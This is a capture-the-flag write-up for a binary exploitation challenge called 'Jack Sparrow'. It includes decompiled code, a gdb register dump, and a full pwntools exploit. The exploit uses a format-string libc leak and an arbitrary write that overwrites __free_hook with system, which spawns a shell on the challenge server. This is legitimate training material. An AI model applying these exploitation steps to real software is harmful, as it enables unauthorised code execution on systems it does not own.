The semi-finals were held in the main auditorium. The challenge was named Jack Sparrow and no source was provided this time.

### Analysis
After reversing, we get the following decompiled code
```C
undefined4 menu(void)
{
  long in_FS_OFFSET;
  undefined4 local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("== Jack Sparrow\'s choices ==");
  puts("1. Specify Destination");
  puts("2. Specify position (latitude and longitude)");
  puts("3. Abandon ship");
  printf("$ ");
  get_input(&local_14);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return local_14;
}

void specify_destination(char *param_1,int param_2)
{
  size_t sVar1;
  
  if ((_spec < 1) && (-1 < _spec)) {
    say_jack("My crew, where shall we sail to?\n");
    say_crew("");
    fgets(param_1,param_2,stdin);
    sVar1 = strcspn(param_1,"\n");
    param_1[sVar1] = '\0';
    say_jack("Well crew, good choice: ");
    printf(param_1);
    puts("");
    _spec = _spec + 1;
  }
  else {
    say_crew("Nah cap. That\'ll be a problem if we change the destination now!\n");
  }
  return;
}

void alter_position(long param_1)
{
  if (*(int *)(param_1 + 0x60) == 0) {
    say("Ragetti","Tell me the coords\n");
    say("Latitude","");
    __isoc99_scanf("%llu",param_1 + 0x50);
    say("Longitude","");
    __isoc99_scanf("%llu",param_1 + 0x58);
    say_jack("Wait, I think those are wrong. ");
    printf("Latitude=%p Longitude=%p\n",*(undefined8 *)(param_1 + 0x50),
           *(undefined8 *)(param_1 + 0x58));
    say_jack("Yeah, they\'re wrong..");
                    /* sus indirection */
    **(undefined8 **)(param_1 + 0x50) = *(undefined8 *)(param_1 + 0x58);
    say("Ragetti","Too late cap. But I\'ll make sure we don\'t change course now.\n");
    *(int *)(param_1 + 0x60) = *(int *)(param_1 + 0x60) + 1;
  }
  else {
    say("Ragetti","No cap! We already changed the position!\n");
  }
  return;
}

undefined8 main(void)
{
  int choice;
  long in_FS_OFFSET;
  undefined buf [96];
  int local_18;
  long local_10;
  bool destFlag;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  destFlag = false;
  local_18 = 0;
  say_jack("I\'m back\n");
  say_crew("Caps\' back boys\n");
  do {
    while( true ) {
      choice = menu();
      if (choice == 3) {
        say_jack(
                "Well crew, you see; they have caught up to me, you take my baby Black Pearl, and li ve.\n"
                );
        say_crew("No capppp.....\n");
        free(buf);
        if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
          return 0;
        }
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      if (choice < 4) break;
LAB_00101794:
      puts(
          "What, what is this choice? I do not understand this..\nQuick quick, Sparrow boutta die.\n "
          );
    }
    if (choice == 1) {
      if (destFlag) {
        say("Crew","Cap, we already changed a destination recently, can\'t do it again now.\n");
      }
      else {
                    /* format string */
        specify_destination(buf,0x50);
        destFlag = true;
      }
    }
    else {
      if (choice != 2) goto LAB_00101794;
      if (local_18 == 0) {
        alter_position(buf);
      }
      else {
        say("Ragetti","No cap! We already changed the position!\n");
      }
    }
  } while( true );
}
```

The program presents us with a menu with 3 options:
1. Specify Destination
2. Specify position
3. Abandon ship

When `1` is selected, the function `specify_destination` is called. The function is passed address of a local buffer and size `0x50`. Call to this function also sets the boolean variable `destFlag` to `true`. Before executing `specify_dest`, this variable is checked that it is `false`. If it is `true`, the program doesn't call `specify_destination` and prints `[Crew]: Cap, we already changed a destination recently, can\'t do it again now.`. Hence we can call `specify_destination` once.

Looking at `specify_destination`, it inputs a string into the buffer address with the given buffer size using `fgets`, so no overflows, but it passes the input to `printf` as the first argument. This means we can perform a format string attack to read or write values. The function has additional checks involving `_spec` global variable. This checks ensure that the main logic is executed once.

When `2` is selected, the function `alter_pos` is called. The function is passed address of the same local buffer. Call to this function is also protected by a flag variable `local_18`. Hence this function can only be called once as well.

Looking at `alter_position`, we see that it inputs two long values using `scanf`, prints these values and then perform a weird indirection and increment a counter. While analysing, I didn't understand what this indirection was doing.

When `3` is selected, the program calls `free` on the local buffer and exits. This seemed weird at the time because the buffer is not located with `malloc` so it will give an error when exiting. Then I thought, perhaps we have to overwrite free's hook and we can use the exit option to execute system function. I had no idea how to overwrite the hook.

For some reason, pwntools' `checksec` wasn't working. I used gdb-gef `checksec` to get the protections enabled. The binary has Full RELRO, NX, PIE and Canary enabled.

At this point, we know that we can do format string attack using `specify_dest` and we need to understand the weird indirection, perhaps it gives us an exploitation vector.

### Exploitation
I started the exploitation by leaking a libc pointer from the stack using the format string vulnerability in `specify_destination` function. I prefixed the format string with `/bin/sh;` to use it when I overwrite the free hook. I leaked the 27th offset value from the stack using `/bin/sh;%27$p`, which was the main's return value.

After calculating libc's base, I set to understand the indirection in `alter_pos` function. I passed `0x41414141` and `0x42424242` as the long values and put a breakpoint at `*alter_position+240` using gdb. When the breakpoint hit, I saw the following:

```
Breakpoint 1, 0x000055555555565e in alter_position ()

[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x41414141        
$rbx   : 0x0               
$rcx   : 0x0               
$rdx   : 0x42424242        
$rsp   : 0x00007fffffffda40  →  0x00000002f7e2b710
$rbp   : 0x00007fffffffda50  →  0x00007fffffffdae0  →  0x00005555555557b0  →  <__libc_csu_init+0000> endbr64 
$rsi   : 0x00007fffffffb360  →  0x7053206b63614a5b ("[Jack Sp"?)
$rdi   : 0x1               
$rip   : 0x000055555555565e  →  <alter_position+00f0> mov QWORD PTR [rax], rdx
$r8    : 0x25              
$r9    : 0x15              
$r10   : 0xffffffeb        
$r11   : 0x246             
$r12   : 0x00005555555551c0  →  <_start+0000> endbr64 
$r13   : 0x00007fffffffdbc0  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffda40│+0x0000: 0x00000002f7e2b710	 ← $rsp
0x00007fffffffda48│+0x0008: 0x00007fffffffda70  →  0x00007fffffffdaf0  →  0x0000000000000001
0x00007fffffffda50│+0x0010: 0x00007fffffffdae0  →  0x00005555555557b0  →  <__libc_csu_init+0000> endbr64 	 ← $rbp
0x00007fffffffda58│+0x0018: 0x0000555555555753  →  <main+00cc> jmp 0x5555555557a1 <main+282>
0x00007fffffffda60│+0x0020: 0x0000000001958ac0
0x00007fffffffda68│+0x0028: 0x0000000200000000
0x00007fffffffda70│+0x0030: 0x00007fffffffdaf0  →  0x0000000000000001
0x00007fffffffda78│+0x0038: 0x0000000000000000
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555652 <alter_position+00e4> mov    rax, QWORD PTR [rax+0x50]
   0x555555555656 <alter_position+00e8> mov    rdx, QWORD PTR [rbp-0x8]
   0x55555555565a <alter_position+00ec> mov    rdx, QWORD PTR [rdx+0x58]
●→ 0x55555555565e <alter_position+00f0> mov    QWORD PTR [rax], rdx
   0x555555555661 <alter_position+00f3> lea    rsi, [rip+0xb70]        # 0x5555555561d8
   0x555555555668 <alter_position+00fa> lea    rdi, [rip+0xae3]        # 0x555555556152
   0x55555555566f <alter_position+0101> call   0x5555555553ab <say>
   0x555555555674 <alter_position+0106> mov    rax, QWORD PTR [rbp-0x8]
   0x555555555678 <alter_position+010a> mov    eax, DWORD PTR [rax+0x60]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "jack-sparrow", stopped 0x55555555565e in alter_position (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55555555565e → alter_position()
[#1] 0x555555555753 → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤ 
```

As it can be seen, the program is writing the second long value to the first long value, interpreting the first long value as an address. This is an arbitrary write-what-where primitive. This was the missing key in my plan of overwriting the free hook.

Now, I use the write-what-where to overwrite free hook with system and selected the third option to execute free on the buffer and I got the shell.

### Final exploit
```py
#!/usr/bin/env python3
from pwn import *

def start() -> tube:
    if args.REMOTE:
        return remote("challs.airoverflow.com", 29798)
    else:
        return elf.process()
    
def attach_gdb() -> None:
    if args.REMOTE or args.NOGDB:
        return
    
    gdb.attach(p, '''
    b *alter_position + 224
    continue
               ''')
    input("ATTACHED?")

def sendchoice(choice: int):
    p.sendlineafter("$ ", str(choice).encode())

def specify_dest(payload: bytes):
    sendchoice(1)

    p.sendlineafter(": ", payload)

def alter_pos(lat: int, long: int):
    sendchoice(2)

    p.sendlineafter(": ", str(lat).encode())
    p.sendlineafter(": ", str(long).encode())

def abandon():
    sendchoice(3)

context.binary = elf = ELF("./jack-sparrow_patched", checksec= False)
libc = elf.libc

p = start()

specify_dest("/bin/sh;%27$p")

p.recvuntil("choice: ")
libc.address = int(p.recvline(False).split(b';')[-1], 0x10) - libc.libc_start_main_return

print(hex(libc.address))

attach_gdb()
alter_pos(libc.sym.__free_hook, libc.sym.system)

abandon()

p.interactive()
p.close()
```